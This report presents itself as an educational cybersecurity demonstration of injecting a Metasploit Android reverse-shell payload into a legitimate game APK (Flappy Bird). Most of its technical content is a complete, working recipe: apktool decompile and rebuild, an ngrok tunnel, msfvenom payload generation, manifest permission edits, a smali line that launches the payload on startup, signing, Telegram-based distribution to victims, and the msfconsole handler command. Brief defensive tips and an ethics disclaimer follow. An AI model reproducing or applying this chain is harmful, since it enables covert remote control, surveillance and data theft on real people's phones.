# Android APK Malware Injection

Android APK Malware Injection - Cybersecurity Report

## Executive Summary

This report documents a cybersecurity demonstration showcasing the process of injecting malicious payloads into legitimate Android applications (APKs). The demonstration illustrates how attackers can compromise mobile applications and establish unauthorized remote connections to victim devices.

## Methodology Overview

**The demonstration follows a systematic approach to APK manipulation:**

1. APK decompilation and analysis
2. Payload generation and preparation
3. Malicious code injection
4. Application recompilation and signing
5. Social engineering distribution
6. Remote access establishment

## Technical Implementation

### 1. APK Decompilation

For this demonstration, we utilized the Flappy Bird APK downloaded from APKpure.com as our target application. The decompilation process was performed using APKTool, a reverse engineering tool for Android applications.

**Command executed:**

```apktool d FlappyBird.apk -o app_decoded```

**This command extracts the APK contents, including:**

- AndroidManifest.xml (application permissions and components)

- Smali code (Dalvik bytecode representation)

- Resources and assets

- Application metadata

### 2. Network Infrastructure Setup

#### Ngrok Tunnel Configuration

To establish a connection pathway from the victim device to our attack infrastructure, we configured Ngrok to create a secure tunnel. Ngrok provides a public endpoint that forwards traffic to our local attack machine.

**Command executed:**

```ngrok tcp 4444```

This creates a TCP tunnel on port 4444, providing us with a public domain and port combination that will be used in our payload configuration.

### 3. Payload Generation

#### Msfvenom Payload Creation

Using Metasploit's msfvenom tool, we generated a malicious Android payload configured to establish a reverse TCP connection to our Ngrok endpoint.

**Command executed:**

```msfvenom -p android/meterpreter/reverse_tcp LHOST=[ngrok_domain] LPORT=[ngrok_port] -o payload.apk```

**Payload decompilation:**

```apktool d payload.apk -o payload_decoded```

This generates the necessary Smali code and resources required for the reverse shell functionality.

### 4. Malicious Code Injection

#### AndroidManifest.xml Modifications

**We modified the target application's AndroidManifest.xml to include the necessary permissions for network communication and system access:**
```
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
```
Smali Code Integration

Metasploit folder integration: Copied the entire com/metasploit/ directory from the payload's decompiled structure to the target application's directory structure.

Activity modification: Modified the main activity file (com/unity3d/player/UnityPlayerActivity.smali) to trigger the malicious payload during application startup.

Code injection location: Within the onCreate method

```invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V```

This ensures the malicious payload executes immediately when the application launches.

### 5. Application Recompilation and Signing

#### APK Rebuilding

```apktool b app_decoded -o mod.apk```

Digital Signature Application

**Since Android requires all applications to be digitally signed, we applied a self-signed certificate:**

```jarsigner -keystore /home/roberto/app/mykey.keystore -storepass qwerty mod.apk myalias```

Note: In a real attack scenario, attackers might use stolen certificates or create convincing fake certificates to avoid detection.

### 6. Social Engineering Distribution

#### Distribution Vector

**The modified APK was distributed through a simulated social engineering campaign using a Telegram channel. This demonstrates how attackers commonly distribute malicious applications through:**

Unofficial app stores

Social media platforms

Messaging applications

Email attachments

Compromised websites

Installation Process

**When victims attempt to install the APK:**

Android displays a warning about installing from unknown sources

Users must manually enable "Install unknown apps" permission

The application requests the previously injected permissions

Upon approval, the malicious payload becomes active

### 7. Attack Infrastructure and Remote Access

Metasploit Handler Configuration

**The attack infrastructure utilizes Metasploit's multi/handler module to receive incoming connections:**

```msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444"```

Connection Establishment

**Once the victim launches the infected application:**

The injected payload executes automatically

A reverse TCP connection is established through the Ngrok tunnel

The attacker gains Meterpreter shell access to the device

Full device compromise is achieved

## Security Implications

#### Attack Capabilities

**Once the connection is established, attackers can:**

- Access device files and personal data

- Activate device cameras and microphones

- Monitor user activities and keystrokes

- Install additional malware

- Use the device as a pivot point for network attacks

- Exfiltrate sensitive information

-  Detection Challenges

**This attack method presents several detection challenges:**

The host application functions normally, masking malicious behavior

Network traffic appears to originate from legitimate application usage

Static analysis may miss the injected code without deep inspection

Users may not notice performance degradation immediately

## Defensive Measures

Technical Countermeasures

Application Verification: Implement robust APK signature verification

Behavioral Analysis: Deploy runtime application self-protection (RASP)

Network Monitoring: Monitor for unusual outbound connections

Sandboxing: Isolate application execution environments

User Education

Source Verification: Only install applications from official app stores

Permission Awareness: Carefully review application permissions

Security Updates: Maintain updated operating systems and security patches

Suspicious Behavior: Monitor for unexpected device behavior

## Conclusion

**This demonstration successfully illustrates the ease with which legitimate Android applications can be weaponized for malicious purposes. The attack chain demonstrates several critical security concepts:**

Supply Chain Security: The importance of verifying application integrity

Social Engineering: How attackers exploit human psychology

Privilege Escalation: How minimal permissions can lead to full device compromise

Detection Evasion: Methods used to avoid security mechanisms

Organizations and individuals must implement comprehensive security strategies that address both technical vulnerabilities and human factors. Regular security assessments, user education programs, and robust monitoring systems are essential for defending against such sophisticated attacks.

## Legal and Ethical Considerations

This research was conducted in a controlled environment for educational purposes only. The techniques demonstrated should only be used by authorized security professionals for legitimate security testing and research. Unauthorized use of these methods constitutes illegal activity and violates computer crime laws.
